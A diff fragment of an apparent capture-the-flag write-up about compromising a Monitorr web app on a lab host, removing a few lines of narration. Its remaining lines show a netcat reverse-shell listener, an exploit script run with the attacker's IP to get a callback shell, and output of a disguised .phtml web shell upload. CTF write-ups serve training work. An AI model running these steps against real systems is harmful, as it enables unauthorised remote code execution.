@@ -64,14 +64,11 @@ $ nc -lvnp 443
 The shell will be established and can be accessed using the following command:
 ```bash
 $ python exploit-rce.py https://monitorr.robyns-petshop.thm <YOUR_IP> 443
-You should see a successful upload and shell access:
 ```
 
 ```vbnet
 
 File pwn2own.gif.phtml has been uploaded to: ../data/usrimg/pwn2own.gif.phtml
-A shell script should be uploaded. Now we try to execute it
-Shell access & Flag 1
 ```
 
 ### Flag 1
